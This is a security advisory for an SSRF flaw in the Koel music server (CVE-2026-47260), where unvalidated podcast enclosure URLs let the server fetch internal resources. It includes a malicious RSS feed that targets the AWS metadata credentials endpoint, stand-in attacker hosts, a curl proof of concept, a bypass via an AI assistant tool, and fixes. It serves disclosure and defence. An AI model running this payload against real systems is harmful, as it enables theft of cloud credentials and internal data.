# [H] Koel Vulnerable to SSRF via Podcast Episode Enclosure URLs

## Summary
Severity: High
Advisory: GHSA-7j2f-6h2r-6cqc
CVE: CVE-2026-47260
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-7j2f-6h2r-6cqc
Type: github-advisory

## Affected
- Packagist: `phanan/koel` — affected >=0 <9.3.5

## Details
## Summary

Koel validates the podcast feed URL via the `SafeUrl` rule (DNS resolution + public IP check), but the individual episode `<enclosure url="...">` values extracted from the RSS XML are stored directly into the database without any SSRF validation. When a user plays an episode, the server downloads the full HTTP response from the unvalidated enclosure URL via `Http::sink()->get()` and streams it back to the user, enabling full-read SSRF against internal services.

---

## Vulnerability Details

### Episode URL Stored Without Validation

**File:** `app/Services/Podcast/PodcastService.php`, line 146

```php
'path' => $episodeValue->enclosure->url,  // Unvalidated URL from RSS XML
```

The `SafeUrl` rule is applied to the podcast feed URL at subscription time (`SubscribeToPodcastRequest`), but episode enclosure URLs parsed from the feed XML are stored as-is.

### SSRF Trigger: Full Content Download

**File:** `app/Values/Podcast/EpisodePlayable.php`, line 42

```php
Http::sink($file)->get($episode->path)->throw();
```

When an episode is played, `PodcastStreamerAdapter::stream()` first attempts `getStreamableUrl()` (OPTIONS/HEAD requests to the episode URL). If no CORS header is present (which internal services won't have), it falls through to `EpisodePlayable::createForEpisode()`, which downloads the full response body and streams it back to the user.

### SafeUrl Applied Only to Feed URL

**File:** `app/Http/Requests/API/Podcast/SubscribeToPodcastRequest.php`

```php
public function rules(): array
{
    return ['url' => ['required', 'url:http,https', new SafeUrl]];
}
```

The `SafeUrl` rule (`app/Rules/SafeUrl.php`) validates scheme, DNS resolution to public IP, and effective URL after redirects. But this only protects the feed URL — not the content within the feed.

---

## Attack Flow

1. Attacker registers an account (Community edition, no Plus required)
2. Attacker hosts a malicious RSS feed on a public server:
   ```xml
   <rss version="2.0">
     <channel>
       <title>Legit Podcast</title>
       <item>
         <title>Episode 1</title>
         <enclosure url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    type="audio/mpeg" length="1000"/>
         <guid>ssrf-1</guid>
       </item>
     </channel>
   </rss>
   ```
3. `POST /api/podcasts` with `url=https://evil.com/feed.xml` — passes `SafeUrl` (public URL)
4. Koel parses feed, stores episode with `path = http://169.254.169.254/...`
5. Attacker plays episode: `GET /play/{episode_id}`
6. Server executes `Http::sink($file)->get("http://169.254.169.254/...")`
7. AWS metadata response downloaded to disk, streamed back to attacker

---

## Proof of Concept

```bash
#!/bin/bash
# PoC: Koel SSRF via Podcast Episode Enclosure URL
# Step 1: Host malicious RSS feed (feed.xml) on attacker server
# Step 2: Subscribe to the podcast

KOEL_URL="https://TARGET"
API_TOKEN="<api_token>"

# Subscribe to malicious podcast
curl -X POST "$KOEL_URL/api/podcasts" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker.com/feed.xml"}'

# List episodes to get the episode ID
EPISODE_ID=$(curl -s "$KOEL_URL/api/podcasts" \
  -H "Authorization: Bearer $API_TOKEN" | jq -r '.[0].episodes[0].id')

# Play the episode — triggers SSRF, returns internal service response
curl "$KOEL_URL/play/$EPISODE_ID?api_token=$API_TOKEN" -o response.bin

cat response.bin
# Expected: AWS metadata / internal service response
```

---

## Impact

- **Cloud credential theft:** Read AWS/GCP/Azure metadata endpoints (IAM credentials, tokens)
- **Internal network reconnaissance:** Scan ports and enumerate internal HTTP services
- **Data exfiltration:** Read responses from internal APIs, admin panels, databases with HTTP interfaces
- **Full response body:** Unlike blind SSRF, the entire response is returned to the attacker

---

## Secondary Finding: SSRF Bypass via AI Radio Station Tool

**File:** `app/Ai/Tools/AddRadioStation.php`, lines 35-38

The AI assistant's `AddRadioStation` tool creates radio stations by calling `RadioService::createRadioStation()` directly, bypassing the `SafeUrl` and `HasAudioContentType` validation rules that protect the REST API endpoint.

**Impact:** Same SSRF but requires Plus license. CVSS 7.7 HIGH.

---

## Novelty Check

- **No existing CVEs found for Koel** (searched NVD, GitHub Advisories, web)
- **No SECURITY.md** in the repository
- **This is a novel vulnerability**

---

## Remediation

**Fix 1:** Validate episode enclosure URLs in `synchronizeEpisodes()`:

```php
foreach ($episodeCollection as $episodeValue) {
    $enclosureUrl = $episodeValue->enclosure->url;
    $host = parse_url($enclosureUrl, PHP_URL_HOST);
    if (!$host || !Network::isPublicHost($host)) {
        continue; // Skip episodes with non-public URLs
    }
    // ... rest of episode creation
}
```

**Fix 2:** Defense-in-depth validation at playback time in `EpisodePlayable::createForEpisode()`.

**Fix 3:** Add `SafeUrl` validation in `AddRadioStation` AI tool.

## References
- https://github.com/koel/koel/security/advisories/GHSA-7j2f-6h2r-6cqc
- https://nvd.nist.gov/vuln/detail/CVE-2026-47260
- https://github.com/koel/koel/commit/8708f077efd7d8a332b32e954d65bc837f3a413a
- https://github.com/koel/koel/commit/be1e867982dcadefd4a75d768ce950b1d5234cdf
- https://github.com/koel/koel
